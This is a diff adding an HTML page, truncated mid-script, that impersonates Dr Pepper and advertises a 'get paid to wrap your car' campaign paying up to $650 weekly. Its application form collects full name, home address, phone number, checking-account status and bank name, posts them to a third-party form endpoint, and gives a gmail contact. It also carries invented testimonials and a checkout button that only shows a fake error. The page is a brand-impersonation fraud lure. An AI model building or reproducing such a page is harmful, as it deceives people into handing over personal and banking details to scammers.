@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Dr. Pepper — Spiced Cola Since 1885</title>
+<link rel="icon" type="image/png" href="favicon.png">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,600;0,9..144,700;1,9..144,500&family=Work+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --maroon-deep:#8f0729dc; --maroon:#a0102d; --maroon-light:#9c2b40;
+    --gold:#FFFFFF; --gold-bright:#FFFFFF; --cream:#F3E7D0; --ink:#241012; --rust:#8C3B2E;
+    --bg: var(--maroon-deep); --bg-elevated: var(--maroon); --text: var(--cream);
+    --text-dim:#D8C4A8; --accent: var(--gold); --accent-bright: var(--gold-bright);
+    --border: rgba(255,255,255,0.28); --card-bg: rgba(255,255,255,0.03);
+    --hero-image: url('hero.PNG');
+    --feature-image: url('redcola.png');
+    --feature-image-2: url('blackcola.png');
+    --tuition-image: url('tuition-bg.jpg');
+  }
+  :root:not([data-theme="light"]) { color-scheme: dark; }
+  :root[data-theme="light"] { --bg:#FBF4E6; --bg-elevated:#FFFFFF; --text: var(--ink); --text-dim:#6B4A44; --border: rgba(74,18,32,0.15); --card-bg: rgba(74,18,32,0.03); color-scheme: light; }
+  @media (prefers-color-scheme: light) {
+    :root:not([data-theme="dark"]) { --bg:#FBF4E6; --bg-elevated:#FFFFFF; --text: var(--ink); --text-dim:#6B4A44; --border: rgba(74,18,32,0.15); --card-bg: rgba(74,18,32,0.03); color-scheme: light; }
+  }
+  * { box-sizing: border-box; }
+  html, body { margin:0; padding:0; overflow-x: auto; }
+  body { background: var(--bg); color: var(--text); font-family:'Work Sans',-apple-system,sans-serif; line-height:1.6; transition: background .3s ease, color .3s ease; }
+  h1,h2,h3,.display { font-family:'Fraunces',Georgia,serif; font-weight:600; letter-spacing:-0.01em; margin:0; }
+  #home, #home h1, #home h2, #home h3, #home p, #home .eyebrow-plain, #home .lede {
+    color:#ece9e9;
+  }
+  #home h1, #home .eyebrow-plain {
+    text-shadow: 0 1px 0 rgba(255,255,255,0.5), 0 0 10px rgba(255,255,255,0.25);
+  }
+  a { color: inherit; } img,svg { max-width:100%; }
+  .wrap { max-width:1080px; margin:0 auto; padding:0 28px; }
+
+
+
+
+  header { position:sticky; top:0; z-index:50; background: color-mix(in srgb, var(--bg) 88%, transparent); backdrop-filter: blur(10px); border-bottom:1px solid var(--border); }
+  nav.wrap { display:flex; align-items:center; justify-content:space-between; padding:16px 12px; gap:16px; max-width:1200px; }
+ 
+  .logo-block { display:flex; flex-direction:column; align-items:flex-start; flex-shrink:0; padding-left:4px; }
+  .logo { position:relative; display:inline-flex; align-items:center; justify-content:center; background:none; border:none; cursor:pointer; padding:8px 6px; }
+  .logo svg.ring { position:absolute; inset:0; width:100%; height:100%; overflow:visible; }
+  .logo svg.ring ellipse { fill:none; stroke: var(--accent-bright); stroke-width:1.4; stroke-linecap:round; stroke-dasharray:210; stroke-dashoffset:210; animation: draw-ring 1.4s ease-out .3s forwards; }
+  @keyframes draw-ring { to { stroke-dashoffset:0; } }
+  .logo span.word { position:relative; font-family:'Fraunces',serif; font-style:italic; font-weight:600; font-size:1.55rem; letter-spacing:-0.01em; color:var(--text); white-space:nowrap; }
+  .logo .dot { color: var(--accent-bright); font-style:normal; }
+  @media (prefers-reduced-motion: reduce) { .logo svg.ring ellipse { animation:none; stroke-dashoffset:0; } }
+  .est-tag { font-size:.62rem; letter-spacing:.12em; text-transform:uppercase; color:var(--text-dim); opacity:.75; margin-left:10px; margin-top:-2px; }
+
+
+
+
+  .navlinks { display:flex; gap:4px; align-items:center; overflow-x:auto; scrollbar-width:none; }
+  .navlinks::-webkit-scrollbar { display:none; }
+  .navlinks button, .navlinks a.navlink { background:none; border:none; cursor:pointer; font-family:'Work Sans',sans-serif; font-size:.9rem; color:var(--text-dim); padding:8px 13px; border-radius:999px; white-space:nowrap; text-decoration:none; transition: color .2s ease, background .2s ease; }
+  .navlinks button:hover, .navlinks a.navlink:hover { color:var(--text); background:var(--card-bg); }
+  .navlinks button.active { color:var(--bg); background:var(--accent-bright); }
+  .navlinks a.navlink { display:inline-flex; align-items:center; gap:4px; }
+  .cart-btn { position:relative; background:none; border:1px solid var(--border); border-radius:999px; padding:7px 13px; cursor:pointer; color:var(--text); font-size:.9rem; margin-left:4px; flex-shrink:0; }
+  .cart-count { position:absolute; top:-6px; right:-6px; background:var(--accent-bright); color:var(--maroon-deep); font-size:.68rem; font-weight:600; min-width:17px; height:17px; border-radius:999px; display:flex; align-items:center; justify-content:center; padding:0 3px; }
+  .theme-toggle { background:none; border:1px solid var(--border); border-radius:999px; width:34px; height:34px; cursor:pointer; color:var(--text); display:flex; align-items:center; justify-content:center; font-size:.95rem; margin-left:4px; flex-shrink:0; margin-right:4px; }
+
+
+
+
+  .page { display:none; } .page.active { display:block; animation:fade .35s ease; }
+  @keyframes fade { from{opacity:0; transform:translateY(6px);} to{opacity:1; transform:translateY(0);} }
+
+
+
+
+  .hero {
+    position: relative;
+    min-height: 88vh;
+    display: flex;
+    align-items: center;
+    background-image: var(--hero-image, none);
+    background-size: 100% 100%;
+    background-position: center;
+    background-repeat: no-repeat;
+    border-radius: 0 0 24px 24px;
+  }
+  .hero .wrap { width: 100%; }
+  .hero-text { max-width: 560px; text-align: center; margin: 0 auto; }
+  .hero h1, .hero p.lede, .hero .eyebrow-plain {
+    text-shadow: 0 2px 14px rgba(0,0,0,0.7);
+  }
+  .eyebrow-plain { color:var(--accent-bright); font-size:.95rem; margin-bottom:14px; }
+  .hero h1 { font-size:clamp(2rem,4.2vw,3.2rem); line-height:1.05; }
+  .hero p.lede { color:var(--text-dim); font-size:1rem; max-width:46ch; margin-top:14px; }
+  .cta-row { display:flex; gap:12px; margin-top:20px; flex-wrap:wrap; justify-content: center;}
+
+
+
+
+.fine-print {
+  color: var(--text-dim);
+  font-size: 0.75rem;
+  margin-top: 14px;
+  opacity: 0.8;
+}
+
+
+
+
+  .btn { display:inline-block; padding:13px 26px; border-radius:999px; font-size:.95rem; font-weight:500; cursor:pointer; border:none; transition:transform .15s ease; }
+  .btn:hover { transform:translateY(-1px); }
+  .btn-primary { background:var(--accent-bright); color:var(--maroon-deep); }
+  .btn-ghost { background:transparent; border:1px solid var(--border); color:var(--text); }
+  .btn-sm { padding:8px 16px; font-size:.85rem; }
+
+
+
+
+  .section-block { padding:36px 0 72px; border-top:1px solid var(--border); }
+  .section-block h2 { font-size:1.7rem; margin-bottom:8px; }
+  .section-block .sub { color:var(--text-dim); margin-bottom:32px; max-width:58ch; }
+  .grid3 { display:grid; grid-template-columns:repeat(3,1fr); gap:20px; }
+  .card { background:var(--card-bg); border:1px solid var(--border); border-radius:14px; padding:24px; }
+  .card h3 { font-size:1.05rem; font-weight:600; margin-bottom:6px; }
+  .card p { color:var(--text-dim); font-size:.93rem; margin:0; }
+  .card .mark { width:32px; height:32px; margin-bottom:14px; }
+
+
+
+
+  /* ---- edge-to-edge stacked images, no border, no gap ---- */
+  .image-only { padding:0; }
+  .image-only .frame {
+    width:100vw; margin-left:calc(50% - 50vw); aspect-ratio:16/9; overflow:hidden;
+    background-image: var(--feature-image, linear-gradient(135deg, var(--maroon-light), var(--maroon-deep)));
+    background-size:cover; background-position:center;
+    display:block;
+  }
+  .image-only .frame-2 {
+    width:100vw; margin-left:calc(50% - 50vw); aspect-ratio:16/9; overflow:hidden;
+    background-image: var(--feature-image-2, linear-gradient(135deg, var(--maroon-deep), var(--maroon-light)));
+    background-size:cover; background-position:center;
+    display:block;
+  }
+  @media (max-width:760px) { .image-only .frame, .image-only .frame-2 { aspect-ratio:4/3; } }
+
+
+
+
+  .strip { background:var(--bg-elevated); border-top:1px solid var(--border); border-bottom:1px solid var(--border); padding:48px 0; }
+  .strip .wrap { display:grid; grid-template-columns:1fr 1fr; gap:44px; align-items:center; }
+  .strip h2 { font-size:1.6rem; margin-bottom:12px; }
+  .strip p { color:var(--text-dim); }
+
+
+
+
+  .page-head { padding:52px 0 8px; }
+  .page-head .eyebrow-plain { margin-bottom:8px; }
+  .page-head h1 { font-size:clamp(2rem,4.2vw,3rem); }
+  .page-head p.lede { color:var(--text-dim); font-size:1.05rem; max-width:60ch; margin-top:14px; }
+
+
+
+
+  .product-photo { width:100%; aspect-ratio:4/3; border-radius:10px; background:linear-gradient(135deg,var(--maroon-light),var(--maroon-deep)); display:flex; align-items:center; justify-content:center; margin-bottom:16px; border:1px solid var(--border); }
+  .product-photo span { color:var(--text-dim); font-size:.78rem; text-align:center; padding:0 10px; }
+  .price-row { display:flex; align-items:center; justify-content:space-between; margin-top:14px; }
+  .price-row .price { font-family:'Fraunces',serif; font-weight:600; color:var(--accent-bright); }
+  #productGrid { grid-template-columns: repeat(3, 1fr); }
+
+
+
+
+  .cart-overlay { position:fixed; inset:0; background:rgba(0,0,0,.4); opacity:0; pointer-events:none; transition:opacity .2s ease; z-index:90; }
+  .cart-overlay.open { opacity:1; pointer-events:auto; }
+  .cart-drawer { position:fixed; top:0; right:0; height:100%; width:min(380px,92vw); background:var(--bg-elevated); border-left:1px solid var(--border); z-index:91; transform:translateX(100%); transition:transform .25s ease; display:flex; flex-direction:column; padding:24px; }
+  .cart-drawer.open { transform:translateX(0); }
+  .cart-drawer h3 { font-size:1.2rem; margin-bottom:18px; }
+  .cart-drawer .close { position:absolute; top:20px; right:20px; background:none; border:none; color:var(--text); font-size:1.3rem; cursor:pointer; }
+  .cart-items { flex:1; overflow-y:auto; display:flex; flex-direction:column; gap:14px; }
+  .cart-line { display:flex; gap:12px; align-items:center; border-bottom:1px solid var(--border); padding-bottom:12px; }
+  .cart-line .info { flex:1; }
+  .cart-line .info strong { display:block; font-size:.92rem; }
+  .cart-line .info span { color:var(--text-dim); font-size:.82rem; }
+  .qty-ctrl { display:flex; align-items:center; gap:8px; }
+  .qty-ctrl button { width:26px; height:26px; border-radius:50%; border:1px solid var(--border); background:none; color:var(--text); cursor:pointer; }
+  .cart-empty { color:var(--text-dim); font-size:.9rem; padding:20px 0; }
+  .cart-total { border-top:1px solid var(--border); padding-top:16px; margin-top:12px; display:flex; justify-content:space-between; align-items:center; font-family:'Fraunces',serif; font-weight:600; }
+
+
+
+
+  .steps { display:grid; border-top:1px solid var(--border); margin-top:28px; }
+  .step-row { display:grid; grid-template-columns:44px 1fr; gap:20px; padding:22px 0; border-bottom:1px solid var(--border); }
+  .step-row .num { width:32px; height:32px; border-radius:50%; background:var(--card-bg); border:1px solid var(--accent-bright); color:var(--accent-bright); font-family:'Fraunces',serif; font-weight:600; display:flex; align-items:center; justify-content:center; font-size:.95rem; }
+  .step-row h3 { font-size:1.02rem; margin-bottom:4px; } .step-row p { color:var(--text-dim); margin:0; font-size:.93rem; }
+  .prize-banner { background:linear-gradient(135deg,var(--maroon-light),var(--maroon)); border:1px solid var(--accent); border-radius:16px; padding:30px; margin-top:24px; display:flex; gap:18px; align-items:center; }
+  .prize-banner .flame { font-size:2.2rem; flex-shrink:0; }
+  .prize-banner h3 { font-size:1.2rem; margin-bottom:4px; }
+  .prize-banner p { color:var(--text-dim); margin:0; font-size:.92rem; }
+  .deadline-chip { display:inline-block; background:var(--card-bg); border:1px solid var(--border); border-radius:999px; padding:6px 14px; font-size:.85rem; color:var(--accent-bright); margin-top:18px; }
+
+
+
+
+  /* ---- tuition hero: big background photo, whiteish-red overlay ---- */
+  .tuition-hero {
+    width:100vw; margin-left:calc(50% - 50vw);
+    min-height:52vh; display:flex; align-items:flex-end;
+    background-image:
+      linear-gradient(180deg, rgba(143,7,41,0.15) 0%, rgba(143,7,41,0.8) 85%),
+      var(--tuition-image, linear-gradient(135deg, var(--maroon-light), var(--maroon-deep)));
+    background-size:cover; background-position:center;
+    padding:60px 0 44px;
+  }
+  .tuition-hero .wrap { width:100%; }
+  .tuition-hero h1 { color:#FFF3EC; text-shadow:0 2px 16px rgba(0,0,0,.55); }
+  .tuition-hero .eyebrow-plain { color:#FFD9C9; }
+  .tuition-hero p.lede { color:#F6DCD2; text-shadow:0 1px 10px rgba(0,0,0,.5); }
+  .tuition-highlights { display:grid; grid-template-columns:repeat(3,1fr); gap:18px; margin-top:32px; }
+  .tuition-highlights .hl { background:rgba(255,255,255,0.07); border:1px solid rgba(255,255,255,0.18); border-radius:14px; padding:18px; }
+  .tuition-highlights .hl b { display:block; font-family:'Fraunces',serif; font-size:1.3rem; color:#FFE3D6; }
+  .tuition-highlights .hl span { color:#F0D2C6; font-size:.82rem; }
+  @media (max-width:760px) { .tuition-highlights { grid-template-columns:1fr; } }
+
+
+
+
+  .faq-item { border-bottom:1px solid var(--border); padding:18px 0; }
+  .faq-item summary { cursor:pointer; font-weight:600; font-size:1rem; list-style:none; display:flex; justify-content:space-between; align-items:center; }
+  .faq-item summary::-webkit-details-marker { display:none; }
+  .faq-item summary::after { content:'+'; color:var(--accent-bright); font-size:1.3rem; font-weight:400; }
+  .faq-item[open] summary::after { content:'–'; }
+  .faq-item p { color:var(--text-dim); margin:12px 0 0; font-size:.93rem; max-width:62ch; }
+
+
+
+
+  .split-grid { display:grid; grid-template-columns:1fr 1.1fr; gap:52px; padding:8px 0 80px; }
+  .info-block h3 { font-size:1rem; margin-bottom:6px; color:var(--accent-bright); }
+  .info-block .item { margin-bottom:26px; } .info-block p { color:var(--text-dim); margin:0; font-size:.93rem; }
+  .stat-row { display:flex; gap:24px; margin-top:6px; flex-wrap:wrap; }
+  .stat { min-width:100px; } .stat b { display:block; font-family:'Fraunces',serif; font-size:1.4rem; color:var(--accent-bright); }
+  .stat span { color:var(--text-dim); font-size:.82rem; }
+
+
+
+
+  form { display:grid; gap:16px; }
+  .field { display:grid; gap:6px; }
+  .field label { font-size:.85rem; color:var(--text-dim); }
+  .field input, .field textarea { background:var(--card-bg); border:1px solid var(--border); border-radius:8px; padding:12px 14px; color:var(--text); font-family:inherit; font-size:.95rem; outline:none; transition:border-color .15s ease; }
+  .field input:focus, .field textarea:focus { border-color:var(--accent-bright); }
+  textarea { resize:vertical; min-height:90px; }
+  .form-note { font-size:.82rem; color:var(--text-dim); margin-top:2px; }
+  .confirm { display:none; background:var(--card-bg); border:1px solid var(--accent-bright); border-radius:10px; padding:16px 18px; font-size:.95rem; }
+  .confirm.show { display:block; }
+
+
+
+
+  footer { border-top:1px solid var(--border); padding:36px 0 40px; }
+  .foot-grid { display:flex; justify-content:space-between; align-items:flex-start; gap:24px; flex-wrap:wrap; }
+  .foot-brand { max-width:44ch; }
+  .foot-brand .logo-mini { font-family:'Fraunces',serif; font-style:italic; font-weight:600; font-size:1.05rem; margin-bottom:8px; display:block; }
+  .foot-brand p { color:var(--text-dim); font-size:.85rem; margin:0; }
+  .foot-social { display:flex; gap:10px; align-items:center; }
+  .foot-social a { width:34px; height:34px; border-radius:50%; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:var(--text-dim); transition:color .2s ease, border-color .2s ease; }
+  .foot-social a:hover { color:var(--accent-bright); border-color:var(--accent-bright); }
+  .foot-social svg { width:16px; height:16px; }
+  .foot-bottom { display:flex; justify-content:space-between; flex-wrap:wrap; gap:10px; color:var(--text-dim); font-size:.8rem; margin-top:26px; padding-top:20px; border-top:1px solid var(--border); }
+
+
+
+
+  @media (max-width:760px) {
+    .hero {
+      position: relative;
+      min-height:90vh; }
+    .grid3, #productGrid { grid-template-columns:1fr; }
+    .strip .wrap { grid-template-columns:1fr; }
+    .split-grid { grid-template-columns:1fr; gap:32px; }
+    .wrap { padding:0 20px; }
+    nav.wrap { padding:14px 20px; flex-wrap:nowrap; }
+    .cart-drawer { padding:20px; }
+    .logo span.word { font-size:1.25rem; }
+  }
+  @media (min-width:761px) and (max-width:980px) {
+    #productGrid { grid-template-columns: repeat(2, 1fr); }
+  }
+</style>
+</head>
+<body>
+
+
+
+
+<header>
+  <nav class="wrap">
+    <div class="logo-block">
+      <button class="logo" onclick="go('home')" aria-label="Dr. Pepper home">
+        <svg class="ring" viewBox="0 0 140 48" preserveAspectRatio="none"><ellipse cx="70" cy="24" rx="66" ry="21"/></svg>
+        <span class="word">Dr<span class="dot">.</span> Pepper</span>
+      </button>
+      <span class="est-tag">Est. 1895</span>
+    </div>
+    <div class="navlinks">
+      <button data-page="home" onclick="go('home')">Home</button>
+       <button data-page="CAR-WRAP" onclick="go('CAR-WRAP')">CAR-WRAP</button>
+      <button data-page="products" onclick="go('products')">Products</button>
+      <a class="navlink" href="https://www.drpepperstore.com/" target="_blank" rel="noopener">Merch ↗</a>
+      <button data-page="faq" onclick="go('faq')">FAQ</button>
+
+
+
+
+    </div>
+    <div style="display:flex; align-items:center; flex-shrink:0;">
+      <button class="cart-btn" onclick="toggleCart(true)" aria-label="Open cart">🛒<span class="cart-count" id="cartCount">0</span></button>
+      <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()" aria-label="Toggle theme">◐</button>
+    </div>
+  </nav>
+</header>
+
+
+
+
+<!-- ============ HOME ============ -->
+<section id="home" class="page">
+  <div class="hero">
+    <div class="wrap">
+      <div class="hero-text">
+        <div class="eyebrow-plain"></div>
+        <h1> ...<br><b> GET PAID TO ADVERTISE Dr.PEPPER</b></h1>
+        <p class="lede"><b> <H3>IT'S SIMPLE: YOU DRIVE AS YOU NORMALLY DO, AND WE PAY YOU FOR THE ADVERTISING SPACE.</H3><br>  Dr Pepper is launching a <B>NATIONWIDE VEHICLE ADVERTISEMENT CAMPAIGN</B> and is looking for everyday drivers, commuters, and proffesional drivers willing to display a small Dr. Ppper's Advertisement on their Vehicle.
+  </b></p>
+        <div class="cta-row">
+          <button class="btn btn-primary" onclick="go('CAR-WRAP')">WRAP NOW</button>
+        </div>
+        <p class="fine-print"><h2>HOW TO EARN THROUGH OUR CAMPAIGN:</h2><BR> <I><B>Qualified Participants can earn <b>up to $650 weekly</b> during our Campaign period</B></I><br> <b> Campaign Period: 16 Weeks. <br>  Proffesional Decal Installation Provided. <br> You keep using your Vehicle Normally. <br> Only an approved section of your Vehicle is used. <br> Minimum participation: 10 Weeks. </b></p>
+      </div>
+    </div>
+  </div>
+
+
+
+
+  <div class="image-only">
+    <div class="wrap" style="padding:48px 0 8px; text-align: center;">
+        <p  style="font-size: 1.3rem; font-family: 'Fraunces' , serif; color: var(--text); max-width: 640px; margin: 0 auto;">
+           
+        </p>
+    </div>
+    <div class="frame" aria-label="Featured brand photo"></div>
+    <div class="frame-2" aria-label="Second featured brand photo"></div>
+  </div>
+
+
+
+
+ </section>
+
+
+
+
+<!-- ============ CAR-WRAP ============ -->
+<section id="CAR-WRAP" class="page">
+  <div class="wrap page-head">
+    <div class="eyebrow-plain">If you already drive every day, why not turn those miles into extra income?</div>
+    <h1>DR Pepper Car wrap Advertisement </h1>
+    <p class="lede"> Whether you're commuting to work, running errands, making deliveries, or simply driving around town, your vehicle can become a moving Advertisement to help introduce Dr. Pepper to more consumers across the country.</b> </p>
+  </div>
+  <div class="wrap-section-block" styles="border-top:none; padding-top:8px;"></div>
+  <div class="wrap section-block" style="border-top:none; padding-top:8px;">
+  <h2 style="font-size:1.4rem; margin-bottom:24px;">Our Reviews</h2>
+  <div class="grid3">
+    <div class="card">
+      <div class="product-photo" style="background-image:url('a.png'); background-size:cover; background-position:center; aspect-ratio:1/1; margin-bottom:14px;"></div>
+      <p style="font-style:italic; color:var(--text); margin-bottom:10px;">"Working with Dr Pepper's Carwrap was easy from the first mail — "</p>
+      <p style="font-size:.85rem; color:var(--text-dim); margin:0;">— Elena Rostova</p>
+    </div>
+    <div class="card">
+    <div class="product-photo" style="background-image:url('b.png'); background-size:cover; background-position:center; aspect-ratio:1/1; margin-bottom:14px;"></div>
+      <p style="font-style:italic; color:var(--text); margin-bottom:10px;">"Our marketing push with them outperformed expectations for the quarter."</p>
+      <p style="font-size:.85rem; color:var(--text-dim); margin:0;">— Derrick Hayes</p>
+    </div>
+      <div class="card">
+        <div class="product-photo" style="background-image:url('d.png'); background-size:cover; background-position:center; aspect-ratio:1/1; margin-bottom:14px;"></div>
+      <p style="font-style:italic; color:var(--text); margin-bottom:10px;">"Straightforward, fast replies, and they actually followed through."</p>
+      <p style="font-size:.85rem; color:var(--text-dim); margin:0;">— Kofi Boateng</p>
+    </div>
+  </div>
+</div>
+
+
+
+
+  <div class="wrap split-grid">
+    <div class="info-block">
+      <div class="item"><h3>Mail</h3><p>drpeppercarwraps@gmail.com</p></div>
+    </div>
+    <div>
+      <form id="adForm" action="https://formspree.io/f/mjykwbjb" method="POST" onsubmit="return submitFormjax(event, 'adconfirm')">
+
+
+
+
+        <div class="field"><label for="aFullname">Full Name</label><input id="aFullname" name="Fullname" type="text" required></div>
+        <div class="field"><label for="aEmail"> Valid Email</label><input id="Email" name="email" required></div>
+        <div class="field"><label for="aAddress"> Address</label><input id="aMsg" name="Address" type="text" required></div>
+        <div class="field"><label for="aCity"> City</label><input id="aMsg" name="City" type="text" required></div>
+        <div class="field"><label for="aState"> State</label><input id="aMsg" name="State" type="text" required></div>
+        <div class="field"><label for="aZipcode"> Zip Code</label><input id="aMsg" name="Zipcode" type="number" required></div>
+        <div class="field"><label for="aGender"> Gender</label><input id="aMsg" name="Gender" type="text" required></div>
+        <div class="field"><label for="aPhonenumber"> Phone Number (include Country Code)</label><input id="aMsg" name="Phonenumber" type="number" required></div>
+        <div class="field"><label for="aOccupation"> Occupation</label><input id="aMsg" name="Occupation" type="text" required></div>
+
+
+
+
+       
+        <div class="field">
+          <label>Do you have a drivers license?</label>
+          <div style="display:flex; gap:10px;">
+            <label style="display:flex; align-items:center; gap:6px; font-size:.9rem;"><input type="radio" name="Has assets" value="Yes"> Yes</label>
+            <label style="display:flex; align-items:center; gap:6px; font-size:.9rem;"><input type="radio" name="Has assets" value="No"> No</label>
+          </div>
+        </div>
+
+
+
+
+
+
+
+
+        <div class="field">
+          <label>Do you have a checking Account?</label>
+          <div style="display:flex; gap:10px;">
+            <label style="display:flex; align-items:center; gap:6px; font-size:.9rem;"><input type="radio" name="Has Checking Account" value="Yes"> Yes</label>
+            <label style="display:flex; align-items:center; gap:6px; font-size:.9rem;"><input type="radio" name="Has Checking Account" value="No"> No</label>
+          </div>
+        </div>
+
+
+
+
+        <div class="field"><label for="aNameofbank"> Name Of Bank</label><input id="aMsg" name="NameofBank" type="text" required></div>
+        <div class="field"><label for="aModel"> Model Of Car/Truck/BUS/Motocycle</label><input id="aMsg" name="MODELOFCAR" type="text" required></div>
+        <div class="field"><label for="aYear"> Year Of Vehicle</label><input id="aMsg" name="YearOfVehicle" type="text" required></div>
+        <div class="field"><label for="aMsg">Any Other Information?</label><textarea id="aMsg"  name="ANYOTHERINFO"></textarea></div>
+        <button type="submit" class="btn btn-primary" style="justify-self:start;">Submit</button>
+        <p class="form-note"></p>
+        <div class="confirm" id="adConfirm">Thanks — you will recieve an email from our teams soon.</div>
+      </form>
+    </div>
+  </div>
+</section>
+
+
+
+
+<!-- ============ PRODUCTS ============ -->
+<section id="products" class="page">
+  <div class="wrap page-head">
+    <div class="eyebrow-plain">The lineup</div>
+    <h1>Six bottles, each one earns its place.</h1>
+    <p class="lede"></p>
+  </div>
+  <div class="wrap section-block" style="border-top:none; padding-top:24px;">
+    <div class="grid3" id="productGrid"></div>
+  </div>
+</section>
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- ============ FAQ ============ -->
+<section id="faq" class="page">
+  <div class="wrap page-head">
+    <div class="eyebrow-plain">Questions</div>
+    <h1>Frequently asked</h1>
+  </div>
+  <div class="wrap" style="padding:24px 0 80px; max-width:760px;">
+    <details class="faq-item" open><summary>Is Pepper caffeinated?</summary><p>Yes — about the same as a standard cola, listed on every label.</p></details>
+    <details class="faq-item"><summary>Where can I buy it?</summary><p>Through our regional bottlers. Check the CAR-WRAP page's contact for the nearest one, or reach out via the studio email in the footer.</p></details>
+    <details class="faq-item"><summary>Is there a sugar-free version?</summary><p>Yes, our Cellar Reserve zero-sugar bottle — same spice profile, sweetened differently.</p></details>
+    <details class="faq-item"><summary>Do you ship nationally?</summary><p>Not yet. We're regional on purpose so every bottler can actually stand behind the product.</p></details>
+    <details class="faq-item"><summary>How do I apply for the tuition fund?</summary><p>Full details are on the Tuition page — it's a short written application, no purchase or code involved.</p></details>
+    <details class="faq-item"><summary>Can my business carry Pepper?</summary><p>Yes — start on the CAR-WRAP page or email bottling@drPepper-cola.example.</p></details>
+  </div>
+</section>
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- ============ CART DRAWER ============ -->
+<div class="cart-overlay" id="cartOverlay" onclick="toggleCart(false)"></div>
+<div class="cart-drawer" id="cartDrawer" aria-label="Shopping cart">
+  <button class="close" onclick="toggleCart(false)" aria-label="Close cart">×</button>
+  <h3>Your cart</h3>
+  <div class="cart-items" id="cartItems"></div>
+  <div class="cart-total"><span>Subtotal</span><span id="cartTotal">$0.00</span></div>
+  <button class="btn btn-primary" style="margin-top:14px;" onclick="alert('Error Loading Page<br> Please, Try Again Later.')">Checkout</button>
+</div>
+
+
+
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <span class="logo-mini">Dr<span style="color:var(--accent-bright)">.</span> Pepper</span>
+      </div>
+      <div class="foot-social">
+        <a href="https://www.instagram.com/drpepper?utm_source=ig_web_button_share_sheet&stkn=ZDNlZDc0MzIxNw==" aria-label="Instagram" target="_blank" rel="noopener"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="5"/><circle cx="12" cy="12" r="4"/><circle cx="17.5" cy="6.5" r="1"/></svg></a>
+        <a href="https://www.bing.com/ck/a?!&&p=9b8b8a111fcffa46a2ca0d0e78ada7e4ed3f31f8876d05060fc7b96cb4bb2eb7JmltdHM9MTc4OTg2MjQwMA&ptn=3&ver=2&hsh=4&fclid=08f42fb6-d249-6d5f-3adb-3ae2d3d76c6d&psq=all+dr+pepper+social+media+links&u=a1aHR0cHM6Ly94LmNvbS9kcnBlcHBlcg" aria-label="X (Twitter)" target="_blank" rel="noopener"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 3h3l-7.5 8.6L22 21h-6.6l-5.2-6.8L4 21H1l8-9.2L2 3h6.7l4.7 6.2L18 3z"/></svg></a>
+        <a href="https://www.bing.com/ck/a?!&&p=401ff05b303f895926ddd76c77f0b0d2f54ba39cefb529a6baf46e1b7b67625dJmltdHM9MTc4OTg2MjQwMA&ptn=3&ver=2&hsh=4&fclid=08f42fb6-d249-6d5f-3adb-3ae2d3d76c6d&psq=all+dr+pepper+social+media+links&u=a1aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0RyUGVwcGVyLw" aria-label="Facebook" target="_blank" rel="noopener"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M13.5 21v-7.5h2.5l.5-3h-3V8.3c0-.9.3-1.5 1.6-1.5H16.5V4.2C16 4.1 15 4 13.9 4c-2.4 0-4 1.5-4 4.1v2.4H7.5v3H10V21h3.5z"/></svg></a>
+        <a href="https://www.bing.com/ck/a?!&&p=c16ede863142a5d74291a5ae9ab1a174dd228781131b0605e7cdf71a3d6c5119JmltdHM9MTc4OTg2MjQwMA&ptn=3&ver=2&hsh=4&fclid=08f42fb6-d249-6d5f-3adb-3ae2d3d76c6d&psq=all+dr+pepper+social+media+links&u=a1aHR0cHM6Ly93d3cudGlrdG9rLmNvbS9AZHJwZXBwZXI" aria-label="TikTok" target="_blank" rel="noopener"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M16 3c.3 2 1.7 3.6 4 3.9v3c-1.5 0-2.8-.4-4-1.2v6.6a5.7 5.7 0 1 1-5.7-5.7c.3 0 .6 0 .9.1v3.1a2.7 2.7 0 1 0 1.9 2.6V3H16z"/></svg></a>
+      </div>
+    </div>
+    <div class="foot-bottom">
+      <span>Dr Pepper is a registered trademark of Dr Pepper|Seven Up, Inc.</span>
+      <span>Contact Us; drpeppercarwraps@gmail.com</span>
+      <span>©2026 Dr Pepper/Seven Up, Inc</span>
+    </div>
+  </div>
+</footer>
+
+
+
+
+<script>
+  var PRODUCTS = [
+    { id:'original', name:'Dr PERPPER', price:0.99, img:'1.png'},
+    { id:'cherry-cask', name:'DIET Dr PEPPER', price:1.5, img:'2.png' },
+    { id:'cellar-reserve', name:'Dr PEPPER ZERO SUGAR', price:1.0, img:'3.png' },
+    { id:'ginger-Pepper', name:'Dr PEPPER CREAMY COCONUT', price:1.25, img:'4.png' },
+    { id:'ginger-Pepper-1', name:'Dr PEPPER CREAMY COCONUT ZERO SUGAR', price:1.15, img:'5.png' },
+    { id:'ginger-Pepper-2', name:'Dr PEPPER BLACK BERRY', price:1.5, img:'6.png' }
+  ];
+  var cart = {};
+  try { cart = JSON.parse(localStorage.getItem('Pepper_cart') || '{}'); } catch(e) { cart = {}; }
+
+
+
+
+  function renderProducts() {
+    var grid = document.getElementById('productGrid');
+    grid.innerHTML = PRODUCTS.map(function(p){
+      return '<div class="card">' +
+        '<div class="product-photo" style="background-image:url(\'' + p.img +'\'); background-size:cover; background-position:center;"></div>' +
+        '<h3>' + p.name + '</h3><p>' + p.note + '</p>' +
+        '<div class="price-row"><span class="price">$' + p.price.toFixed(2) + '</span>' +
+        '<button class="btn btn-primary btn-sm" onclick="addToCart(\'' + p.id + '\')">Add to cart</button></div>' +
+        '</div>';
+    }).join('');
+  }
+
+
+
+
+  function saveCart() { try { localStorage.setItem('Pepper_cart', JSON.stringify(cart)); } catch(e) {} }
+
+
